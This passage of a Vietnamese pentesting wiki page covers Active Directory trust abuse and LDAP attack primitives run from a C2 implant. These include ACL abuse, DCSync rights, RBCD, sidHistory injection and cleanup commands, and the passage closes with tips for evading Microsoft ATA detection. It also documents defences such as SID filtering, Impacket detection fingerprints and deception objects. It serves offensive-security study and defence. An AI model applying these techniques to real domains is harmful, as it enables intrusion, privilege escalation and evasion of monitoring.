TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Trong kịch bản này, **domain của bạn** đang **trust** một số **privileges** cho principal thuộc **các domain khác**.

Tuy nhiên, khi một **domain được trusting domain trust**, trusted domain sẽ **tạo một user** có **tên dễ đoán** và dùng **trusted password** làm **password**. Điều này có nghĩa là có thể **truy cập một user trong trusting domain để xâm nhập trusted domain**, enumerate domain đó và tìm cách escalate thêm privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Một cách khác để compromise trusted domain là tìm một [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) được tạo theo **hướng ngược lại** với domain trust (điều này không phổ biến).

Một cách khác để compromise trusted domain là chờ trên một máy mà **user từ trusted domain có thể truy cập** để đăng nhập qua **RDP**. Sau đó, attacker có thể inject code vào tiến trình của RDP session và từ đó **truy cập domain gốc của nạn nhân**.\
Ngoài ra, nếu **nạn nhân đã mount ổ cứng**, attacker có thể dùng tiến trình **RDP session** để lưu **backdoors** vào **startup folder của ổ cứng**. Kỹ thuật này được gọi là **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Biện pháp giảm thiểu việc lạm dụng domain trust

### **SID Filtering:**

- Rủi ro từ các cuộc tấn công khai thác thuộc tính SID history qua forest trust được giảm thiểu bằng SID Filtering, tính năng được bật mặc định trên mọi inter-forest trust. Biện pháp này dựa trên giả định rằng intra-forest trust là an toàn, xem forest chứ không phải domain là ranh giới bảo mật, theo quan điểm của Microsoft.
- Tuy nhiên, SID filtering có thể làm gián đoạn ứng dụng và quyền truy cập của user, dẫn đến việc đôi khi tính năng này bị vô hiệu hóa.

### **Selective Authentication:**

- Với inter-forest trust, sử dụng Selective Authentication đảm bảo user từ hai forest không được tự động xác thực. Thay vào đó, user cần được cấp quyền rõ ràng để truy cập các domain và server trong trusting domain hoặc forest.
- Cần lưu ý rằng các biện pháp này không bảo vệ khỏi việc khai thác writable Configuration Naming Context (NC) hoặc các cuộc tấn công vào trust account.

[**Tìm hiểu thêm về domain trust trên ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Lạm dụng AD dựa trên LDAP từ implant trên máy chủ

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) triển khai lại các LDAP primitive kiểu bloodyAD dưới dạng x64 Beacon Object File, chạy hoàn toàn bên trong implant trên máy chủ (ví dụ: Adaptix C2). Operator biên dịch pack bằng `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, rồi gọi `ldap <subcommand>` từ beacon. Toàn bộ traffic sử dụng security context của phiên đăng nhập hiện tại qua LDAP (389) với signing/sealing hoặc LDAPS (636) với auto certificate trust, do đó không cần socks proxy hay disk artifact.<sup>[[4]](#references)</sup>

### LDAP enumeration phía implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` và `get-groupmembers` phân giải tên rút gọn/đường dẫn OU thành DN đầy đủ rồi dump các object tương ứng.
- `get-object`, `get-attribute` và `get-domaininfo` truy xuất các attribute tùy ý (bao gồm security descriptor), cùng metadata forest/domain từ `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` và `get-rbcd` hiển thị các ứng viên roasting, cấu hình delegation và descriptor [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) hiện có trực tiếp từ LDAP.
- `get-acl` và `get-writable --detailed` phân tích DACL để liệt kê trustee, quyền (GenericAll/WriteDACL/WriteOwner/ghi attribute) và inheritance, giúp xác định ngay các mục tiêu để escalation privilege qua ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Các primitive ghi LDAP để leo thang đặc quyền và duy trì quyền truy cập

- Các BOF tạo đối tượng (`add-user`, `add-computer`, `add-group`, `add-ou`) cho phép operator tạo sẵn principal hoặc machine account ở bất kỳ nơi nào có quyền trên OU. `add-groupmember`, `set-password`, `add-attribute` và `set-attribute` trực tiếp chiếm quyền kiểm soát mục tiêu khi phát hiện quyền write-property.
- Các lệnh tập trung vào ACL như `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` và `add-dcsync` biến WriteDACL/WriteOwner trên bất kỳ đối tượng AD nào thành quyền đặt lại mật khẩu, kiểm soát membership của group hoặc quyền replication DCSync mà không để lại dấu vết PowerShell/ADSI. Các lệnh `remove-*` tương ứng dùng để dọn dẹp ACE đã chèn.

### Delegation, roasting và lạm dụng Kerberos

- `add-spn`/`set-spn` lập tức khiến user bị xâm nhập có thể bị Kerberoast; `add-asreproastable` (thay đổi UAC) đánh dấu user đó để AS-REP roasting mà không cần chạm đến mật khẩu.
- Các macro delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) sửa đổi `msDS-AllowedToDelegateTo`, các cờ UAC hoặc `msDS-AllowedToActOnBehalfOfOtherIdentity` từ beacon, cho phép các đường tấn công constrained/unconstrained/RBCD và loại bỏ nhu cầu dùng PowerShell từ xa hoặc RSAT.

### Chèn sidHistory, di chuyển OU và định hình bề mặt tấn công

- `add-sidhistory` chèn các SID đặc quyền vào lịch sử SID của một principal do attacker kiểm soát (xem [Chèn SID-History](sid-history-injection.md)), tạo khả năng kế thừa quyền truy cập một cách kín đáo hoàn toàn qua LDAP/LDAPS.
- `move-object` thay đổi DN/OU của máy tính hoặc user, cho phép attacker đưa tài sản vào phạm vi quyền được ủy quyền trước khi dùng `set-password`, `add-groupmember` hoặc `add-spn`. Xem [Di chuyển OU và quyền được kế thừa](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) để biết về quyền di chuyển và kiểm tra kế thừa.
- Các lệnh xóa có phạm vi giới hạn (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, v.v.) cho phép rollback nhanh sau khi operator thu thập credential hoặc thiết lập persistence, giúp giảm thiểu telemetry.

## AD -> Azure và Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Một số biện pháp phòng vệ chung

[**Tìm hiểu thêm về cách bảo vệ credential tại đây.**](../stealing-credentials/credentials-protections.md)

### **Biện pháp phòng vệ để bảo vệ credential**

- **Hạn chế Domain Admins**: Khuyến nghị chỉ cho phép Domain Admins đăng nhập vào Domain Controller, tránh sử dụng tài khoản này trên các host khác.
- **Đặc quyền của Service Account**: Không nên chạy service với đặc quyền Domain Admin (DA) để đảm bảo an toàn.
- **Giới hạn thời gian đặc quyền**: Với các tác vụ cần đặc quyền DA, hãy giới hạn thời gian sử dụng. Có thể thực hiện bằng: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Giảm thiểu LDAP relay**: Kiểm tra Event ID 2889/3074/3075, sau đó áp dụng LDAP signing và LDAPS channel binding trên DC/client để chặn các nỗ lực LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting hoạt động Impacket ở cấp giao thức

Nếu muốn phát hiện tradecraft AD phổ biến, **đừng chỉ dựa vào các dấu vết do operator kiểm soát** như binary đã đổi tên, tên service, file batch tạm thời hoặc đường dẫn đầu ra. Hãy lập baseline về cách các client Windows hợp lệ tạo lưu lượng [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC và WMI, sau đó tìm các **đặc điểm triển khai khác thường** vẫn còn ngay cả khi operator chỉnh sửa `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` hoặc `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Các dấu hiệu độc lập có độ tin cậy cao** (sau khi đối chiếu với baseline của chính bạn):
  - DCE/RPC đã xác thực sử dụng `auth_context_id = 79231 + ctx_id`
  - Phần padding xác thực DCE/RPC được điền bằng `0xff`
  - LDAP Kerberos bind đặt trực tiếp Kerberos `AP-REQ` thô trong SPNEGO `mechToken`
  - Yêu cầu SMB2/3 negotiate có giá trị `ClientGuid` trông như ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` sử dụng namespace không chuẩn `//./root/cimv2`
  - Giá trị nonce Kerberos được hardcode
- **Phù hợp hơn để dùng làm dấu hiệu tương quan/chấm điểm**:
  - Danh sách Kerberos etype thưa hoặc trùng lặp, `PA-DATA` bất thường/thiếu, hoặc thứ tự etype của TGS-REQ khác với Windows gốc
  - Thông điệp NTLM Type 1 thiếu thông tin version hoặc thông điệp Type 3 có tên host null
  - NTLMSSP thô được truyền trong DCE/RPC thay vì SPNEGO, thiếu verification trailer của DCE/RPC, hoặc OID SPNEGO/Kerberos không khớp
  - Nhiều đặc điểm trong số này từ cùng host/user/session/khoảng thời gian đáng tin cậy hơn nhiều so với bất kỳ trường yếu nào đứng riêng lẻ
- **Dùng để bổ sung ngữ cảnh, không dùng làm cảnh báo độc lập**:
  - Tên file mặc định, đường dẫn đầu ra, tên service ngẫu nhiên, tên batch tạm thời, tên computer account mặc định và các chuỗi HTTP/WebDAV/RDP/MSSQL đặc trưng của công cụ
  - Operator dễ dàng thay đổi các dấu vết này; tốt nhất nên dùng chúng để giải thích vì sao một cụm dấu hiệu liên giao thức đáng ngờ
- **Lưu ý vận hành**:
  - Một số tín hiệu cần lưu lượng đã giải mã, [phân tích PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW hoặc khả năng quan sát từ phía service
  - Trước khi chuyển thành cảnh báo, hãy kiểm tra với client Samba/Linux, thiết bị chuyên dụng và phần mềm cũ
  - Khi độ tin cậy của baseline tăng lên, hãy nâng cấp phát hiện theo lộ trình enrichment -> hunting -> alerting

### **Triển khai kỹ thuật đánh lạc hướng**

- Triển khai kỹ thuật đánh lạc hướng bằng cách đặt bẫy, chẳng hạn như user hoặc computer mồi nhử có các đặc điểm như mật khẩu không hết hạn hoặc được đánh dấu là Trusted for Delegation. Một phương pháp chi tiết gồm tạo user với quyền cụ thể hoặc thêm họ vào các group có đặc quyền cao.<sup>[[2]](#references)</sup>
- Ví dụ thực tế là sử dụng các công cụ như: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Tìm hiểu thêm về triển khai kỹ thuật đánh lạc hướng tại [Deploy-Deception trên GitHub](https://github.com/samratashok/Deploy-Deception).

### **Nhận diện kỹ thuật đánh lạc hướng**

- **Với User Object**: Các dấu hiệu đáng ngờ gồm ObjectSID khác thường, số lần đăng nhập thấp, ngày tạo bất thường và số lần nhập sai mật khẩu thấp.
- **Dấu hiệu chung**: So sánh thuộc tính của các đối tượng mồi nhử tiềm năng với đối tượng thật có thể phát hiện điểm không nhất quán. Các công cụ như [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) có thể hỗ trợ nhận diện những kỹ thuật đánh lạc hướng này.

### **Vượt qua hệ thống phát hiện**

- **Vượt qua phát hiện của Microsoft ATA**:
  - **Liệt kê user**: Tránh liệt kê session trên Domain Controller để ngăn ATA phát hiện.
  - **Giả mạo ticket**: Dùng khóa **aes** để tạo ticket giúp né phát hiện bằng cách không hạ cấp xuống NTLM.
  - **Tấn công DCSync**: Nên thực hiện từ máy không phải Domain Controller để tránh ATA phát hiện, vì thực hiện trực tiếp từ Domain Controller sẽ kích hoạt cảnh báo.

## References

- [1] [Hướng dẫn tấn công Domain Trust](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Giả mạo Trust để đánh lạc hướng trong Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Từ Domain Admin đến Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Bộ sưu tập LDAP BOF – Bộ công cụ LDAP trong bộ nhớ để khai thác Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Biến NTLM Hash thành Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Phân tích Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Chiếm quyền các tài khoản Active Directory qua Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Cách quản lý các thay đổi trong kết nối secure channel Netlogon liên quan đến CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Hành trình khám phá các giao diện Null Session và MS-RPC bị lãng quên](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter có phải là ranh giới bảo mật giữa các domain không? (Phần 4) - Nghiên cứu vượt qua SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter có phải là ranh giới bảo mật giữa các domain không? (Phần 5) - Tấn công trust Golden GMSA - từ child lên parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter có phải là ranh giới bảo mật giữa các domain không? (Phần 6) - Tấn công trust bằng thay đổi schema - từ child lên parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Từ DA đến EA với ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Leo thang từ admin của child domain lên enterprise admin trong 5 phút bằng cách lạm dụng AD CS, phần tiếp theo](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Một ACE dự phòng: Thiết kế backdoor DACL cho Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Mã nguồn module pre2k của NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - Thuộc tính msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
